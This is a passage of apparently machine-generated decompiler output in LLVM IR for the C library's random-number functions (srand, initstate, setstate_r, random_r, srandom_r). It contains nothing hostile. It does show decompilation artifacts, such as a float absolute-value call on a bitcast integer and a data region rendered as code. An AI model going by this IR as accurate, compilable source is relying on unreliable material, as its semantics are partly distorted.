  %v3_dafc = load i32, i32* bitcast (i32** @global_var_1e6f0.581 to i32*), align 4
  store i32 %v3_dafc, i32* @r4, align 4
  %v3_db00 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1e6e8)
  %v1_db08 = icmp slt i32 %v3_db00, 0
  store i32 %v2_dac0, i32* @r0, align 4
  %. = select i1 %v1_db08, i32 0, i32 ptrtoint (i32** @global_var_1e6ec.583 to i32)
  %v1_db20 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_db50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_db50, i32* @r0, align 4
  %v1_db74 = call i32 @__pthread_return_void()
  %v1_db84 = call i32 @__pthread_return_0()
  %v0_db8c = load i32, i32* @r5, align 4
  %v0_db90 = load i32, i32* @r6, align 4
  %v0_db94 = load i32, i32* @r8, align 4
  %v3_db98 = load i32, i32* bitcast (i32** @global_var_1e6f0.581 to i32*), align 4
  store i32 %v3_db98, i32* @r4, align 4
  %v4_db9c = inttoptr i32 %v0_db8c to i32*
  %v5_db9c = call i32 @__GI_initstate_r(i32 %v0_db94, i32* %v4_db9c, i32 %v0_db90, i32 ptrtoint (i32* @global_var_1e6e8 to i32))
  store i32 %v2_db50, i32* @r0, align 4
  %v1_dbb0 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1e6ec.583 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_dbe0 = load i32, i32* @r4, align 4
  %v9_dbe0 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_1e6d0.568 to i32), i32* @r4, align 4
  %v2_dbe8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_dbe8, i32* @r0, align 4
  %v1_dc04 = call i32 @__pthread_return_void()
  %v1_dc14 = call i32 @__pthread_return_0()
  %v0_dc18 = load i32, i32* @r6, align 4
  store i32 %v0_dc18, i32* @r0, align 4
  %v2_dc20 = inttoptr i32 %v0_dc18 to i32*
  %v3_dc20 = call i32 @srandom_r(i32* %v2_dc20, i32 ptrtoint (i32* @global_var_1e6e8 to i32))
  store i32 %v2_dbe8, i32* @r0, align 4
  %v1_dc38 = call i32 @__pthread_return_void()
  store i32 %v3_dbe0, i32* @r4, align 4
  store i32 %v9_dbe0, i32* @r6, align 4
  ret i32 %v1_dc38

; uselistorder directives
  uselistorder i32* @global_var_1e6e8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1e6e8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_dc5c = add i32 %tmp, 12
  %v2_dc5c = inttoptr i32 %v1_dc5c to i32*
  %v3_dc5c = load i32, i32* %v2_dc5c, align 4
  %v3_dc60 = load i32, i32* @r4, align 4
  store i32 %v3_dc60, i32* %stack_var_-20, align 4
  %v2_dc64 = icmp eq i32 %v3_dc5c, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_dc64, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_dc701 = add i32 %tmp, 8
  %v2_dc702 = inttoptr i32 %v1_dc701 to i32*
  %v3_dc703 = load i32, i32* %v2_dc702, align 4
  store i32 %v3_dc703, i32* %r1.global-to-local, align 4
  %v3_dc84 = add i32 %v3_dc703, -4
  %v4_dc84 = inttoptr i32 %v3_dc84 to i32*
  store i32 0, i32* %v4_dc84, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_dc6c = add i32 %tmp, 4
  %v3_dc6c = inttoptr i32 %v2_dc6c to i32*
  %v4_dc6c = load i32, i32* %v3_dc6c, align 4
  %v1_dc70 = add i32 %tmp, 8
  %v2_dc70 = inttoptr i32 %v1_dc70 to i32*
  %v3_dc70 = load i32, i32* %v2_dc70, align 4
  store i32 %v3_dc70, i32* %r1.global-to-local, align 4
  %v3_dc74 = sub i32 %v4_dc6c, %v3_dc70
  %v4_dc78 = sdiv i32 %v3_dc74, 4
  %v4_dc80 = mul i32 %v4_dc78, 5
  %v5_dc80 = add i32 %v4_dc80, %v3_dc5c
  %v3_dc88 = add i32 %v3_dc70, -4
  %v4_dc88 = inttoptr i32 %v3_dc88 to i32*
  store i32 %v5_dc80, i32* %v4_dc88, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_dc8c = add i32 %arg1, 4
  store i32 %v1_dc8c, i32* %r6.global-to-local, align 4
  %v2_dc90 = inttoptr i32 %arg1 to i32*
  %v3_dc90 = load i32, i32* %v2_dc90, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_dc98 = srem i32 %v3_dc90, 5
  store i32 %v2_dc98, i32* %r0.global-to-local, align 4
  %v2_dca4 = and i32 %v2_dc98, 1073741824
  %v3_dca4 = icmp ne i32 %v2_dca4, 0
  %v4_dca4 = mul nsw i32 %v2_dc98, 4
  %v2_dca8 = icmp ne i32 %v2_dc98, 4
  %v3_dca8 = and i1 %v3_dca4, %v2_dca8
  br i1 %v3_dca8, label %dec_label_pc_dd04, label %dec_label_pc_dcac

dec_label_pc_dcac:                                ; preds = %bb
  %v5_dca4 = add i32 %v4_dca4, ptrtoint (i32* @global_var_14f60.597 to i32)
  %v1_dcac = add i32 %v4_dca4, add (i32 ptrtoint (i32* @global_var_14f60.597 to i32), i32 20)
  %v2_dcac = inttoptr i32 %v1_dcac to i32*
  %v3_dcac = load i32, i32* %v2_dcac, align 4
  store i32 %v3_dcac, i32* %r5.global-to-local, align 4
  %v6_dcb0 = inttoptr i32 %v5_dca4 to i32*
  %v7_dcb0 = load i32, i32* %v6_dcb0, align 4
  store i32 %v7_dcb0, i32* %r7.global-to-local, align 4
  %v2_dcb4 = icmp eq i32 %v2_dc98, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_dcbc = load i32, i32* %r4.global-to-local, align 4
  %v2_dcbc = add i32 %v1_dcbc, 16
  %v3_dcbc = inttoptr i32 %v2_dcbc to i32*
  store i32 %v3_dcac, i32* %v3_dcbc, align 4
  %v0_dcc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_dcc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcc0 = add i32 %v1_dcc0, 20
  %v3_dcc0 = inttoptr i32 %v2_dcc0 to i32*
  store i32 %v0_dcc0, i32* %v3_dcc0, align 4
  %v0_dcc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_dcc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcc4 = add i32 %v1_dcc4, 12
  %v3_dcc4 = inttoptr i32 %v2_dcc4 to i32*
  store i32 %v0_dcc4, i32* %v3_dcc4, align 4
  br i1 %v2_dcb4, label %dec_label_pc_dcf0, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcac
  %v0_dccc = load i32, i32* %r6.global-to-local, align 4
  %v1_dccc = add i32 %v0_dccc, -4
  %v2_dccc = inttoptr i32 %v1_dccc to i32*
  %v3_dccc = load i32, i32* %v2_dccc, align 4
  %v1_dcd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_dcd0 = sdiv i32 %v3_dccc, %v1_dcd0
  store i32 %v2_dcd0, i32* %r0.global-to-local, align 4
  %v4_dcd4 = mul i32 %v2_dcd0, 4
  %v5_dcd4 = add i32 %v4_dcd4, %v0_dccc
  %v1_dcd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcd8 = add i32 %v1_dcd8, 4
  %v3_dcd8 = inttoptr i32 %v2_dcd8 to i32*
  store i32 %v5_dcd4, i32* %v3_dcd8, align 4
  %v0_dcdc = load i32, i32* %r0.global-to-local, align 4
  %v1_dcdc = load i32, i32* %r7.global-to-local, align 4
  %v2_dcdc = add i32 %v1_dcdc, %v0_dcdc
  %v0_dce0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_dce0, i32* %r1.global-to-local, align 4
  %v2_dce4 = srem i32 %v2_dcdc, %v0_dce0
  %v0_dce8 = load i32, i32* %r6.global-to-local, align 4
  %v4_dce8 = mul i32 %v2_dce4, 4
  %v5_dce8 = add i32 %v0_dce8, %v4_dce8
  store i32 %v5_dce8, i32* %r0.global-to-local, align 4
  %v1_dcec = load i32, i32* %r4.global-to-local, align 4
  %v2_dcec = inttoptr i32 %v1_dcec to i32*
  store i32 %v5_dce8, i32* %v2_dcec, align 4
  br label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dccc
  %v0_dcf0 = load i32, i32* %r6.global-to-local, align 4
  %v1_dcf0 = load i32, i32* %r5.global-to-local, align 4
  %v4_dcf0 = mul i32 %v1_dcf0, 4
  %v5_dcf0 = add i32 %v4_dcf0, %v0_dcf0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dcf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcf8 = add i32 %v1_dcf8, 24
  %v3_dcf8 = inttoptr i32 %v2_dcf8 to i32*
  store i32 %v5_dcf0, i32* %v3_dcf8, align 4
  %v0_dcfc = load i32, i32* %r6.global-to-local, align 4
  %v1_dcfc = load i32, i32* %r4.global-to-local, align 4
  %v2_dcfc = add i32 %v1_dcfc, 8
  %v3_dcfc = inttoptr i32 %v2_dcfc to i32*
  store i32 %v0_dcfc, i32* %v3_dcfc, align 4
  %v2_dd00 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dd00, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_dd04:                                ; preds = %bb
  %v0_dd04 = call i32 @__errno_location()
  %v2_dd0c = inttoptr i32 %v0_dd04 to i32*
  store i32 22, i32* %v2_dd0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_dd14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dd14, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_dc98, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcf0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_dd1c = add i32 %tmp, 12
  %v2_dd1c = inttoptr i32 %v1_dd1c to i32*
  %v3_dd1c = load i32, i32* %v2_dd1c, align 4
  store i32 %v3_dd1c, i32* %r3.global-to-local, align 4
  %v2_dd20 = icmp eq i32 %v3_dd1c, 0
  %v3_dd24 = load i32, i32* @r4, align 4
  store i32 %v3_dd24, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_dd30 = add i32 %tmp, 8
  %v2_dd30 = inttoptr i32 %v1_dd30 to i32*
  %v3_dd30 = load i32, i32* %v2_dd30, align 4
  store i32 %v3_dd30, i32* %lr.global-to-local, align 4
  br i1 %v2_dd20, label %dec_label_pc_dd38, label %dec_label_pc_dd5c

dec_label_pc_dd38:                                ; preds = %entry
  %v1_dd38 = inttoptr i32 %v3_dd30 to i32*
  %v2_dd38 = load i32, i32* %v1_dd38, align 4
  store i32 %v2_dd38, i32* %r2.global-to-local, align 4
  %v2_dd40 = mul i32 %v2_dd38, 1103515245
  %v1_dd48 = add i32 %v2_dd40, 12345
  %tmp10 = bitcast i32 %v1_dd48 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_dd4c = bitcast float %tmp11 to i32
  store i32 %v1_dd4c, i32* %r3.global-to-local, align 4
  store i32 %v1_dd4c, i32* %v1_dd38, align 4
  %v0_dd54 = load i32, i32* %r3.global-to-local, align 4
  %v2_dd54 = inttoptr i32 %arg2 to i32*
  store i32 %v0_dd54, i32* %v2_dd54, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dd5c:                                ; preds = %entry
  %v2_dd5c = load i32, i32* %arg1, align 4
  store i32 %v2_dd5c, i32* %r2.global-to-local, align 4
  %v1_dd60 = add i32 %tmp, 4
  %v2_dd60 = inttoptr i32 %v1_dd60 to i32*
  %v3_dd60 = load i32, i32* %v2_dd60, align 4
  store i32 %v3_dd60, i32* %r0.global-to-local, align 4
  %v1_dd64 = inttoptr i32 %v2_dd5c to i32*
  %v2_dd64 = load i32, i32* %v1_dd64, align 4
  store i32 %v2_dd64, i32* %r3.global-to-local, align 4
  %v1_dd68 = inttoptr i32 %v3_dd60 to i32*
  %v2_dd68 = load i32, i32* %v1_dd68, align 4
  %v4_dd68 = add i32 %v3_dd60, 4
  store i32 %v4_dd68, i32* %r0.global-to-local, align 4
  %v2_dd6c = add i32 %v2_dd68, %v2_dd64
  store i32 %v2_dd6c, i32* %r3.global-to-local, align 4
  store i32 %v2_dd6c, i32* %v1_dd64, align 4
  %v3_dd70 = load i32, i32* %r2.global-to-local, align 4
  %v4_dd70 = add i32 %v3_dd70, 4
  store i32 %v4_dd70, i32* %r2.global-to-local, align 4
  %v0_dd74 = load i32, i32* %ip.global-to-local, align 4
  %v1_dd74 = add i32 %v0_dd74, 24
  %v2_dd74 = inttoptr i32 %v1_dd74 to i32*
  %v3_dd74 = load i32, i32* %v2_dd74, align 4
  store i32 %v3_dd74, i32* %r4.global-to-local, align 4
  %v0_dd78 = load i32, i32* %r3.global-to-local, align 4
  %v3_dd78 = udiv i32 %v0_dd78, 2
  store i32 %v3_dd78, i32* %r3.global-to-local, align 4
  %v3_dd7c = icmp ult i32 %v4_dd70, %v3_dd74
  %v1_dd80 = load i32, i32* %r5.global-to-local, align 4
  %v2_dd80 = inttoptr i32 %v1_dd80 to i32*
  store i32 %v3_dd78, i32* %v2_dd80, align 4
  br i1 %v3_dd7c, label %dec_label_pc_dd90, label %bb

bb:                                               ; preds = %dec_label_pc_dd5c
  %v1_dd84 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_dd84, i32* %r2.global-to-local, align 4
  %v0_dd88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dd88, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd5c
  %v0_dd881 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dd881, i32* %r3.global-to-local, align 4
  %v1_dd90 = load i32, i32* %r4.global-to-local, align 4
  %v3_dd90 = icmp ult i32 %v0_dd881, %v1_dd90
  br i1 %v3_dd90, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_dd90
  store i32 %v0_dd881, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_dd90
  %v1_dd98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_dd98, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_dd9c = load i32, i32* %ip.global-to-local, align 4
  %v1_dd9c = inttoptr i32 %v0_dd9c to i32*
  %v2_dd9c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_dd9c, i32* %v1_dd9c, align 4
  %v3_dd9c = add i32 %v0_dd9c, 4
  %v4_dd9c = inttoptr i32 %v3_dd9c to i32*
  %v5_dd9c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_dd9c, i32* %v4_dd9c, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd38, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dda4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dda4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_dd881, { 1, 0, 2 }
  uselistorder i32 %v3_dd78, { 1, 0 }
  uselistorder i32 %v1_dd4c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_dda0, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ddac = load i32, i32* @r4, align 4
  store i32 %v3_ddac, i32* %stack_var_-32, align 4
  %v6_ddac = load i32, i32* @r5, align 4
  %v1_ddb0 = add i32 %tmp, 12
  %v2_ddb0 = inttoptr i32 %v1_ddb0 to i32*
  %v3_ddb0 = load i32, i32* %v2_ddb0, align 4
  %v2_ddb8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_ddb0, 4
  br i1 %tmp29, label %.dec_label_pc_de64_crit_edge, label %dec_label_pc_ddc8

.dec_label_pc_de64_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_de64

dec_label_pc_ddc8:                                ; preds = %entry
  %v0_ddc8 = load i32, i32* @r0, align 4
  %v2_ddc8 = icmp eq i32 %v0_ddc8, 0
  %v1_ddcc = add i32 %tmp, 8
  %v2_ddcc = inttoptr i32 %v1_ddcc to i32*
  %v3_ddcc = load i32, i32* %v2_ddcc, align 4
  store i32 %v3_ddcc, i32* %r7.global-to-local, align 4
  br i1 %v2_ddc8, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_ddc8
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_ddc8, %bb
  %v0_ddd8 = phi i32 [ %v0_ddc8, %dec_label_pc_ddc8 ], [ 1, %bb ]
  %v2_ddd4 = icmp eq i32 %v3_ddb0, 0
  %v2_ddd8 = inttoptr i32 %v3_ddcc to i32*
  store i32 %v0_ddd8, i32* %v2_ddd8, align 4
  br i1 %v2_ddd4, label %dec_label_pc_de60, label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %bb21
  %v1_dde0 = add i32 %tmp, 16
  %v2_dde0 = inttoptr i32 %v1_dde0 to i32*
  %v3_dde0 = load i32, i32* %v2_dde0, align 4
  store i32 %v3_dde0, i32* %sb.global-to-local, align 4
  %v0_dde4 = load i32, i32* @r0, align 4
  %v0_dde8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_dde8, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_de3023 = icmp sgt i32 %v3_dde0, 1
  br i1 %v5_de3023, label %dec_label_pc_ddf4, label %dec_label_pc_de34

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_dde0, %dec_label_pc_ddf4
  %v0_de0425 = phi i32 [ %v0_de24.pre, %dec_label_pc_ddf4 ], [ %v0_dde4, %dec_label_pc_dde0 ]
  %v1_de1c24 = phi i32 [ %v5_de1c, %dec_label_pc_ddf4 ], [ %v0_dde8, %dec_label_pc_dde0 ]
  %v2_ddf4 = srem i32 %v0_de0425, ptrtoint (i32* @global_var_1f31d.601 to i32)
  %v2_de00 = mul i32 %v2_ddf4, 16807
  %v2_de08 = sdiv i32 %v0_de0425, ptrtoint (i32* @global_var_1f31d.601 to i32)
  %tmp30 = mul i32 %v2_de08, -2836
  %v2_de14 = add i32 %v2_de00, %tmp30
  %v8_de14 = icmp slt i32 %v2_de14, 0
  %v2_de18 = add i32 %v2_de14, 2147483647
  %v2_de18.v2_de14 = select i1 %v8_de14, i32 %v2_de18, i32 %v2_de14
  store i32 %v2_de18.v2_de14, i32* @r5, align 4
  %v2_de1c = add i32 %v1_de1c24, 4
  %v3_de1c = inttoptr i32 %v2_de1c to i32*
  store i32 %v2_de18.v2_de14, i32* %v3_de1c, align 4
  %v4_de1c = load i32, i32* %sl.global-to-local, align 4
  %v5_de1c = add i32 %v4_de1c, 4
  store i32 %v5_de1c, i32* %sl.global-to-local, align 4
  %v0_de20.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_de20.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_de24.pre = load i32, i32* @r5, align 4
  %v1_de2c = add i32 %v0_de20.pre, 1
  store i32 %v1_de2c, i32* %r8.global-to-local, align 4
  %v5_de30 = icmp slt i32 %v0_de20.pre, %v1_de20.pre
  br i1 %v5_de30, label %dec_label_pc_ddf4, label %dec_label_pc_de20.dec_label_pc_de34_crit_edge

dec_label_pc_de20.dec_label_pc_de34_crit_edge:    ; preds = %dec_label_pc_ddf4
  %v0_de40.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_de34

dec_label_pc_de34:                                ; preds = %dec_label_pc_de20.dec_label_pc_de34_crit_edge, %dec_label_pc_dde0
  %v0_de40 = phi i32 [ %v0_de40.pre, %dec_label_pc_de20.dec_label_pc_de34_crit_edge ], [ %v0_dde8, %dec_label_pc_dde0 ]
  %v0_de38.lcssa = phi i32 [ %v1_de20.pre, %dec_label_pc_de20.dec_label_pc_de34_crit_edge ], [ %v3_dde0, %dec_label_pc_dde0 ]
  %v2_de38 = mul i32 %v0_de38.lcssa, 10
  store i32 %v2_de38, i32* @r4, align 4
  %v0_de3c = load i32, i32* %r6.global-to-local, align 4
  %v1_de3c = add i32 %v0_de3c, 20
  %v2_de3c = inttoptr i32 %v1_de3c to i32*
  %v3_de3c = load i32, i32* %v2_de3c, align 4
  %v4_de40 = mul i32 %v3_de3c, 4
  %v5_de40 = add i32 %v0_de40, %v4_de40
  %v1_de44 = inttoptr i32 %v0_de3c to i32*
  store i32 %v5_de40, i32* %v1_de44, align 4
  %v3_de44 = add i32 %v0_de3c, 4
  %v4_de44 = inttoptr i32 %v3_de44 to i32*
  %v5_de44 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_de44, i32* %v4_de44, align 4
  br label %dec_label_pc_de50

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de50
  %v0_de54 = load i32, i32* %r6.global-to-local, align 4
  %v2_de4c = inttoptr i32 %v0_de54 to i32*
  %v3_de4c = call i32 @__GI_random_r(i32* %v2_de4c, i32 %v2_ddb8)
  br label %dec_label_pc_de50

dec_label_pc_de50:                                ; preds = %dec_label_pc_de34, %dec_label_pc_de4c
  %v0_de50 = load i32, i32* @r4, align 4
  %v1_de50 = add i32 %v0_de50, -1
  store i32 %v1_de50, i32* @r4, align 4
  %v6_de50 = icmp slt i32 %v1_de50, 0
  br i1 %v6_de50, label %dec_label_pc_de60, label %dec_label_pc_de4c

dec_label_pc_de60:                                ; preds = %dec_label_pc_de50, %bb21
  %v2_de68.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %.dec_label_pc_de64_crit_edge, %dec_label_pc_de60
  %v2_de68 = phi i32 [ %v3_ddac, %.dec_label_pc_de64_crit_edge ], [ %v2_de68.pre, %dec_label_pc_de60 ]
  %v26_de68 = phi i32 [ -1, %.dec_label_pc_de64_crit_edge ], [ 0, %dec_label_pc_de60 ]
  store i32 %v2_de68, i32* @r4, align 4
  store i32 %v6_ddac, i32* @r5, align 4
  ret i32 %v26_de68

; uselistorder directives
  uselistorder i32 %v1_de50, { 1, 0 }
  uselistorder i32 %v0_de3c, { 1, 0, 2 }
  uselistorder i32 %v0_de20.pre, { 1, 0 }
  uselistorder i32 %v5_de1c, { 1, 0 }
  uselistorder i32 %v2_de14, { 2, 1, 0 }
  uselistorder i32 %v0_de0425, { 1, 0 }
  uselistorder i32 %v0_dde8, { 1, 0, 2 }
  uselistorder i32 %v3_dde0, { 1, 0, 2 }
  uselistorder i32 %v3_ddb0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1f31d.601 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %dec_label_pc_de50, { 1, 0 }
  uselistorder label %dec_label_pc_ddf4, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_de6c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_de6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de6c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_de6c
  %v2_de6c = load i32, i32* @r7, align 4
  %v5_de6c = udiv i32 %v2_de6c, 8
  %v6_de6c = and i32 %v5_de6c, %arg1
  store i32 %v6_de6c, i32* %r4.global-to-local, align 4
  %v2_de70 = load i32, i32* @sp, align 4
  %v8_de70 = shl i32 %v2_de70, %arg3
  %v9_de70 = and i32 %v8_de70, %arg2
  call void @__pseudo_branch(i32 %v9_de70)
  %v0_de74.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_de74 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_de74.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_de74 = load i32, i32* %r4.global-to-local, align 4
  %v3_de74 = load i32, i32* @fp, align 4
  %v8_de74 = shl i32 %v2_de74, %v3_de74
  %v9_de74 = and i32 %v8_de74, %v1_de74
  store i32 %v9_de74, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_de6c, %bb
  %v10_de74 = phi i32 [ %arg1, %dec_label_pc_de6c ], [ %v9_de74, %bb ], [ %v1_de74, %.thread ]
  ret i32 %v10_de74

; uselistorder directives
  uselistorder i32 %v1_de74, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_de7c = load i32, i32* @r4, align 4
  store i32 %v3_de7c, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg3, 128
  br i1 %tmp28, label %dec_label_pc_de9c, label %dec_label_pc_de8c

dec_label_pc_de8c:                                ; preds = %entry
  %v2_de8c = icmp ugt i32 %arg3, 254
  %v7_de8c = icmp eq i32 %arg3, 255
  %v2_de90 = xor i1 %v7_de8c, true
  %v3_de90 = and i1 %v2_de8c, %v2_de90
  br i1 %v3_de90, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_de8c
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_de8c, %bb
  %v1_dec47 = phi i32 [ %v3_de7c, %dec_label_pc_de8c ], [ 4, %bb ]
  %v2_de94 = xor i1 %v2_de8c, true
  %v3_de94 = or i1 %v7_de8c, %v2_de94
  br i1 %v3_de94, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_de9c:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg3, 31
  br i1 %tmp29, label %dec_label_pc_deb4, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de9c
  %tmp30 = icmp ugt i32 %arg3, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_df20

.thread10:                                        ; preds = %dec_label_pc_dea4
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de9c
